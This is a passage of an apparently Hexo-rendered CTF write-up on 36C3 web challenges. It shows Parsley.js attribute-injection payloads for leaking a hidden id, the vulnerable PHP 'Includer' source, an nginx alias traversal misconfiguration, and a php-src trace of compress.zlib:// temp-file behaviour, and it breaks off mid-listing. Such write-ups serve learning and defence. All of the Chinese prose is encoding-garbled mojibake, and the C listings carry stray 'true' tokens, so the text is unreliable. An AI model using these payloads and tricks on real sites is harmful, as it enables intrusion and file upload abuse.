<span class="attr">name</span>=<span class="string">"some-field"</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">data-parsley-error-message</span>=<span class="string">"&lt;input id=like type=button&gt;"</span> <span class="attr">data-parsley-required</span></span></span><br><span class="line"><span class="tag">         <span class="attr">data-parsley-errors-container</span>=<span class="string">"a:contains('Writeup - 5'):eq(0)"</span> /&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="æˆ–è€…ä½¿ç”¨data-parsley-equalto-API-è¿›è¡Œåˆ¤æ–­å±æ€§å€¼ï¼š"><a href="#æˆ–è€…ä½¿ç”¨data-parsley-equalto-API-è¿›è¡Œåˆ¤æ–­å±æ€§å€¼ï¼š" class="headerlink" title="æˆ–è€…ä½¿ç”¨data-parsley-equalto API è¿›è¡Œåˆ¤æ–­å±æ€§å€¼ï¼š"></a>æˆ–è€…ä½¿ç”¨<code>data-parsley-equalto</code> API è¿›è¡Œåˆ¤æ–­å±æ€§å€¼ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data-parsley-equalto=â€#anotherfieldâ€</span><br><span class="line"></span><br><span class="line">Validates that the value is identical to another fieldâ€™s value (useful for password confirmation check).</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">data-parsley-validate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">data-parsley-trigger</span>=<span class="string">"focusout"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">data-parsley-equalto</span>=<span class="string">'a[href^="/show.php?id=GUESS"]'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">data-parsley-errors-container</span>=<span class="string">"form[action='/like.php']"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">data-parsley-error-message</span>=<span class="string">'&lt;input type="input" name="id" value="0000000000000000"&gt;'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">value</span>=<span class="string">'a[href^="/show.php?id=GUESS"]'</span></span></span><br><span class="line"><span class="tag">        <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-Includer"><a href="#0x03-Includer" class="headerlink" title="0x03 Includer"></a>0x03 Includer</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Difficulty estimate: medium</span><br><span class="line"></span><br><span class="line">Solved:9/321</span><br><span class="line"></span><br><span class="line">Points: round(1000 Â· min(1, 10 / (9 + [9 solves]))) = 556 points</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line"></span><br><span class="line">Just sitting here and waiting for PHP 8.0 (lolphp).</span><br><span class="line"></span><br><span class="line">Download:</span><br><span class="line"></span><br><span class="line">https://github.com/ZeddYu/36c3-CTF-Web/blob/master/includer/includer-df39401c4c1c28ab.tar.xz</span><br></pre></td></tr></table></figure>

<h6 id="é¢˜ç›®ç»™å‡ºæºä»£ç ä»¥åŠéƒ¨ç½²æ–‡ä»¶ï¼Œæºä»£ç å¦‚ä¸‹ï¼š"><a href="#é¢˜ç›®ç»™å‡ºæºä»£ç ä»¥åŠéƒ¨ç½²æ–‡ä»¶ï¼Œæºä»£ç å¦‚ä¸‹ï¼š" class="headerlink" title="é¢˜ç›®ç»™å‡ºæºä»£ç ä»¥åŠéƒ¨ç½²æ–‡ä»¶ï¼Œæºä»£ç å¦‚ä¸‹ï¼š"></a>é¢˜ç›®ç»™å‡ºæºä»£ç ä»¥åŠéƒ¨ç½²æ–‡ä»¶ï¼Œæºä»£ç å¦‚ä¸‹ï¼š</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$rand_dir = <span class="string">'files/'</span>.bin2hex(random_bytes(<span class="number">32</span>));</span><br><span class="line">mkdir($rand_dir) || <span class="keyword">die</span>(<span class="string">'mkdir'</span>);</span><br><span class="line">putenv(<span class="string">'TMPDIR='</span>.<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$rand_dir) || <span class="keyword">die</span>(<span class="string">'putenv'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello '</span>.$_POST[<span class="string">'name'</span>].<span class="string">' your sandbox: '</span>.$rand_dir.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos(file_get_contents($_POST[<span class="string">'file'</span>]), <span class="string">'&lt;?'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">include_once</span>($_POST[<span class="string">'file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    system(<span class="string">'rm -rf '</span>.escapeshellarg($rand_dir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Configuration-Error"><a href="#Configuration-Error" class="headerlink" title="Configuration Error"></a>Configuration Error</h6><h6 id="å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š"><a href="#å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š" class="headerlink" title="å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š"></a>å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /.well-known &#123;</span><br><span class="line">  autoindex on;</span><br><span class="line">  alias /var/www/html/well-known/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚"><a href="#å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚" class="headerlink" title="å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚"></a>å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚</h6><h6 id="Update-Arbitrary-Data"><a href="#Update-Arbitrary-Data" class="headerlink" title="Update Arbitrary Data"></a>Update Arbitrary Data</h6><h6 id="ä¸€å¼€å§‹çœ‹åˆ°è¿‡æ»¤äº†-lt-ï¼Œå°±æƒ³åˆ°äº†pç‰›åšå®¢é‡Œé¢æœ‰å…³æ­»äº¡exitçš„å†…å®¹ï¼Œè°ˆä¸€è°ˆphp-filterçš„å¦™ç”¨ï¼Œä½†æ˜¯pç‰›çš„åŸæ–‡ç”¨çš„æ˜¯file-put-contentï¼Œä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯file-get-contentsï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­ä¹Ÿåœ¨ä½¿ç”¨äº†file-get-contentså‡½æ•°ä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰-lt-ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–ç ç»•è¿‡å°±ä¸å¤ªå¯èƒ½äº†ã€‚"><a href="#ä¸€å¼€å§‹çœ‹åˆ°è¿‡æ»¤äº†-lt-ï¼Œå°±æƒ³åˆ°äº†pç‰›åšå®¢é‡Œé¢æœ‰å…³æ­»äº¡exitçš„å†…å®¹ï¼Œè°ˆä¸€è°ˆphp-filterçš„å¦™ç”¨ï¼Œä½†æ˜¯pç‰›çš„åŸæ–‡ç”¨çš„æ˜¯file-put-contentï¼Œä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯file-get-contentsï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­ä¹Ÿåœ¨ä½¿ç”¨äº†file-get-contentså‡½æ•°ä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰-lt-ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–ç ç»•è¿‡å°±ä¸å¤ªå¯èƒ½äº†ã€‚" class="headerlink" title="ä¸€å¼€å§‹çœ‹åˆ°è¿‡æ»¤äº†&lt;?ï¼Œå°±æƒ³åˆ°äº†pç‰›åšå®¢é‡Œé¢æœ‰å…³æ­»äº¡exitçš„å†…å®¹ï¼Œè°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ï¼Œä½†æ˜¯pç‰›çš„åŸæ–‡ç”¨çš„æ˜¯file_put_contentï¼Œä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯file_get_contentsï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­ä¹Ÿåœ¨ä½¿ç”¨äº†file_get_contentså‡½æ•°ä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰&lt;?ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–ç ç»•è¿‡å°±ä¸å¤ªå¯èƒ½äº†ã€‚"></a>ä¸€å¼€å§‹çœ‹åˆ°è¿‡æ»¤äº†<code>&lt;?</code>ï¼Œå°±æƒ³åˆ°äº†pç‰›åšå®¢é‡Œé¢æœ‰å…³æ­»äº¡<code>exit</code>çš„å†…å®¹ï¼Œ<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a>ï¼Œä½†æ˜¯pç‰›çš„åŸæ–‡ç”¨çš„æ˜¯<code>file_put_content</code>ï¼Œä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯<code>file_get_contents</code>ï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­ä¹Ÿåœ¨ä½¿ç”¨äº†<code>file_get_contents</code>å‡½æ•°ä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰<code>&lt;?</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–ç ç»•è¿‡å°±ä¸å¤ªå¯èƒ½äº†ã€‚</h6><h6 id="è€Œä¸”è¿™é‡Œæœ€å¥‡æ€ªçš„å°±æ˜¯ä¹‹å‰ç”¨äº†ä¸€äº›çœ‹ä¼¼æ— å…³ç´§è¦çš„ä»£ç ï¼Œæ¯”å¦‚ä½¿ç”¨äº†putenv-å‡½æ•°ç­‰ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªsandboxï¼Œç„¶è€Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•åˆ©ç”¨è¡¨é¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ç­‰æ“ä½œã€‚"><a href="#è€Œä¸”è¿™é‡Œæœ€å¥‡æ€ªçš„å°±æ˜¯ä¹‹å‰ç”¨äº†ä¸€äº›çœ‹ä¼¼æ— å…³ç´§è¦çš„ä»£ç ï¼Œæ¯”å¦‚ä½¿ç”¨äº†putenv-å‡½æ•°ç­‰ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªsandboxï¼Œç„¶è€Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•åˆ©ç”¨è¡¨é¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ç­‰æ“ä½œã€‚" class="headerlink" title="è€Œä¸”è¿™é‡Œæœ€å¥‡æ€ªçš„å°±æ˜¯ä¹‹å‰ç”¨äº†ä¸€äº›çœ‹ä¼¼æ— å…³ç´§è¦çš„ä»£ç ï¼Œæ¯”å¦‚ä½¿ç”¨äº†putenv()å‡½æ•°ç­‰ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªsandboxï¼Œç„¶è€Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•åˆ©ç”¨è¡¨é¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ç­‰æ“ä½œã€‚"></a>è€Œä¸”è¿™é‡Œæœ€å¥‡æ€ªçš„å°±æ˜¯ä¹‹å‰ç”¨äº†ä¸€äº›çœ‹ä¼¼æ— å…³ç´§è¦çš„ä»£ç ï¼Œæ¯”å¦‚ä½¿ç”¨äº†<code>putenv()</code>å‡½æ•°ç­‰ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ª<code>sandbox</code>ï¼Œç„¶è€Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•åˆ©ç”¨è¡¨é¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ç­‰æ“ä½œã€‚</h6><h6 id="balsné˜Ÿä¼åœ¨å…¬å¼€çš„wpä¸­å†™äº†æ¯”è¾ƒè¯¦ç»†çš„æºç åˆ†æï¼Œè¿™é‡Œæˆ‘å°±é…åˆå…¶ä¸­çš„wpè¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†æã€‚"><a href="#balsné˜Ÿä¼åœ¨å…¬å¼€çš„wpä¸­å†™äº†æ¯”è¾ƒè¯¦ç»†çš„æºç åˆ†æï¼Œè¿™é‡Œæˆ‘å°±é…åˆå…¶ä¸­çš„wpè¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†æã€‚" class="headerlink" title="balsné˜Ÿä¼åœ¨å…¬å¼€çš„wpä¸­å†™äº†æ¯”è¾ƒè¯¦ç»†çš„æºç åˆ†æï¼Œè¿™é‡Œæˆ‘å°±é…åˆå…¶ä¸­çš„wpè¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†æã€‚"></a>balsné˜Ÿä¼åœ¨å…¬å¼€çš„wpä¸­å†™äº†æ¯”è¾ƒè¯¦ç»†çš„æºç åˆ†æï¼Œè¿™é‡Œæˆ‘å°±é…åˆå…¶ä¸­çš„wpè¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†æã€‚</h6><h6 id="é¦–å…ˆç›´æ¥ç»™å‡ºç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨compress-zlib-æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³åŸç†ã€‚"><a href="#é¦–å…ˆç›´æ¥ç»™å‡ºç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨compress-zlib-æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³åŸç†ã€‚" class="headerlink" title="é¦–å…ˆç›´æ¥ç»™å‡ºç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨compress.zlib://æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³åŸç†ã€‚"></a>é¦–å…ˆç›´æ¥ç»™å‡ºç»“è®ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>compress.zlib://</code>æµè¿›è¡Œä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œæ¥ç€æˆ‘ä»¬æ¥çœ‹çœ‹ç›¸å…³åŸç†ã€‚</h6><h6 id="åœ¨php-srcæºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æµçš„ç›¸å…³è§¦å‘è§£æå‡½æ•°php-stream-gzopen"><a href="#åœ¨php-srcæºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æµçš„ç›¸å…³è§¦å‘è§£æå‡½æ•°php-stream-gzopen" class="headerlink" title="åœ¨php-srcæºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æµçš„ç›¸å…³è§¦å‘è§£æå‡½æ•°php_stream_gzopen"></a>åœ¨<a href="https://github.com/php/php-src" target="_blank" rel="noopener">php-src</a>æºç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¯¥æµçš„ç›¸å…³è§¦å‘è§£æå‡½æ•°<code>php_stream_gzopen</code></h6><h6 id="ext-zlib-zlib-fopen-wrapper-c"><a href="#ext-zlib-zlib-fopen-wrapper-c" class="headerlink" title="ext/zlib/zlib_fopen_wrapper.c"></a><code>ext/zlib/zlib_fopen_wrapper.c</code></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">php_stream *<span class="title">php_stream_gzopen</span><span class="params">(php_stream_wrapper *wrapper, <span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> options,</span></span></span><br><span class="line"><span class="function"><span class="params">							  zend_string **opened_path, php_stream_context *context STREAMS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="literal">true</span>...</span><br><span class="line">trueif (strncasecmp(<span class="string">"compress.zlib://"</span>, path, <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">truetruepath += <span class="number">16</span>;</span><br><span class="line"><span class="literal">true</span>&#125; <span class="keyword">else</span> <span class="keyword">if</span> (strncasecmp(<span class="string">"zlib:"</span>, path, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">truetruepath += <span class="number">5</span>;</span><br><span class="line"><span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line">trueinnerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);</span><br><span class="line"><span class="literal">true</span>...</span><br><span class="line">truereturn <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ‡å¿—ä½STREAM-WILL-CASTï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªæ ‡å¿—ä½ç”¨æ¥å¹²å˜›ï¼Œåœ¨main-php-streams-hå®šä¹‰äº†è¯¥æ ‡å¿—ä½"><a href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ‡å¿—ä½STREAM-WILL-CASTï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªæ ‡å¿—ä½ç”¨æ¥å¹²å˜›ï¼Œåœ¨main-php-streams-hå®šä¹‰äº†è¯¥æ ‡å¿—ä½" class="headerlink" title="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ‡å¿—ä½STREAM_WILL_CASTï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªæ ‡å¿—ä½ç”¨æ¥å¹²å˜›ï¼Œåœ¨main/php_streams.hå®šä¹‰äº†è¯¥æ ‡å¿—ä½:"></a>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªæ ‡å¿—ä½<code>STREAM_WILL_CAST</code>ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªæ ‡å¿—ä½ç”¨æ¥å¹²å˜›ï¼Œåœ¨<code>main/php_streams.h</code>å®šä¹‰äº†è¯¥æ ‡å¿—ä½:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If you are going to end up casting the stream into a FILE* or</span></span><br><span class="line"><span class="comment"> * a socket, pass this flag and the streams/wrappers will not use</span></span><br><span class="line"><span class="comment"> * buffering mechanisms while reading the headers, so that HTTP</span></span><br><span class="line"><span class="comment"> * wrapped streams will work consistently.</span></span><br><span class="line"><span class="comment"> * If you omit this flag, streams will use buffering and should end</span></span><br><span class="line"><span class="comment"> * up working more optimally.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STREAM_WILL_CAST                0x00000020</span></span><br></pre></td></tr></table></figure>

<h6 id="å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥å°†streamè½¬æ¢æˆFILE-çš„æ ‡å¿—ä½ï¼Œåœ¨è¿™é‡Œå°±ä¸æˆ‘ä»¬åˆ›å»ºä¸´æ—¶æ–‡ä»¶æœ‰å…³äº†ã€‚"><a href="#å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥å°†streamè½¬æ¢æˆFILE-çš„æ ‡å¿—ä½ï¼Œåœ¨è¿™é‡Œå°±ä¸æˆ‘ä»¬åˆ›å»ºä¸´æ—¶æ–‡ä»¶æœ‰å…³äº†ã€‚" class="headerlink" title="å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥å°†streamè½¬æ¢æˆFILE*çš„æ ‡å¿—ä½ï¼Œåœ¨è¿™é‡Œå°±ä¸æˆ‘ä»¬åˆ›å»ºä¸´æ—¶æ–‡ä»¶æœ‰å…³äº†ã€‚"></a>å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨æ¥å°†streamè½¬æ¢æˆFILE*çš„æ ‡å¿—ä½ï¼Œåœ¨è¿™é‡Œå°±ä¸æˆ‘ä»¬åˆ›å»ºä¸´æ—¶æ–‡ä»¶æœ‰å…³äº†ã€‚</h6><h6 id="æ¥ç€æˆ‘ä»¬è·Ÿè¿›php-stream-open-wrapper-exå‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨main-php-streams-hä¸­è¢«defineä¸º-php-stream-open-wrapper-exã€‚"><a href="#æ¥ç€æˆ‘ä»¬è·Ÿè¿›php-stream-open-wrapper-exå‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨main-php-streams-hä¸­è¢«defineä¸º-php-stream-open-wrapper-exã€‚" class="headerlink" title="æ¥ç€æˆ‘ä»¬è·Ÿè¿›php_stream_open_wrapper_exå‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨main/php_streams.hä¸­è¢«defineä¸º_php_stream_open_wrapper_exã€‚"></a>æ¥ç€æˆ‘ä»¬è·Ÿè¿›<code>php_stream_open_wrapper_ex</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨<code>main/php_streams.h</code>ä¸­è¢«defineä¸º<code>_php_stream_open_wrapper_ex</code>ã€‚</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI php_stream *_php_stream_open_wrapper_ex(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> options,</span><br><span class="line">truetruezend_string **opened_path, php_stream_context *context STREAMS_DC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="literal">true</span><span class="comment">//...</span></span><br><span class="line">trueif (stream != <span class="literal">NULL</span> &amp;&amp; (options &amp; STREAM_MUST_SEEK)) &#123;</span><br><span class="line">truetruephp_stream *newstream;</span><br><span class="line"></span><br><span class="line">truetrueswitch(php_stream_make_seekable_rel(stream, &amp;newstream,</span><br><span class="line">truetruetruetruetrue(options &amp; STREAM_WILL_CAST)</span><br><span class="line">truetruetruetruetruetrue? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE))</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">truereturn stream;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure>

<h6 id="è¯¥å‡½æ•°è°ƒç”¨äº†php-stream-make-seekable-relï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥äº†STREAM-WILL-CASTå‚æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›php-stream-make-seekable-relå‡½æ•°ï¼Œå®ƒåœ¨main-php-streams-hä¸­è¢«defineä¸º-php-stream-make-seekableï¼Œç»§ç»­è·Ÿè¿›"><a href="#è¯¥å‡½æ•°è°ƒç”¨äº†php-stream-make-seekable-relï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥äº†STREAM-WILL-CASTå‚æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›php-stream-make-seekable-relå‡½æ•°ï¼Œå®ƒåœ¨main-php-streams-hä¸­è¢«defineä¸º-php-stream-make-seekableï¼Œç»§ç»­è·Ÿè¿›" class="headerlink" title="è¯¥å‡½æ•°è°ƒç”¨äº†php_stream_make_seekable_relï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥äº†STREAM_WILL_CASTå‚æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›php_stream_make_seekable_relå‡½æ•°ï¼Œå®ƒåœ¨main/php_streams.hä¸­è¢«defineä¸º_php_stream_make_seekableï¼Œç»§ç»­è·Ÿè¿›"></a>è¯¥å‡½æ•°è°ƒç”¨äº†<code>php_stream_make_seekable_rel</code>ï¼Œå¹¶å‘å…¶ä¸­ä¼ å…¥äº†<code>STREAM_WILL_CAST</code>å‚æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>php_stream_make_seekable_rel</code>å‡½æ•°ï¼Œå®ƒåœ¨<code>main/php_streams.h</code>ä¸­è¢«defineä¸º<code>_php_stream_make_seekable</code>ï¼Œç»§ç»­è·Ÿè¿›</h6><h6 id="main-streams-cast-c"><a href="#main-streams-cast-c" class="headerlink" title="main/streams/cast.c"></a><code>main/streams/cast.c</code></h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &#123;&#123;&#123; php_stream_make_seekable */</span></span><br><span class="line">PHPAPI <span class="keyword">int</span> _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, <span class="keyword">int</span> flags STREAMS_DC)</span><br><span class="line">&#123;</span><br><span class="line">trueif (newstream == <span class="literal">NULL</span>) &#123;</span><br><span class="line">truetruereturn PHP_STREAM_FAILED;</span><br><span class="line"><span class="literal">true</span>&#125;</span><br><span class="line"><span class="literal">true</span>*newstream = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">trueif (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == <span class="number">0</span>) &amp;&amp; origstream-&gt;ops-&gt;seek != <span class="literal">NULL</span>) &#123;</span><br><span class="line">truetrue*newstream = origstream;</span><br><span class="line">truetruereturn PHP_STREAM_UNCHANGED;</span><br><span class="line"><span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line"><span 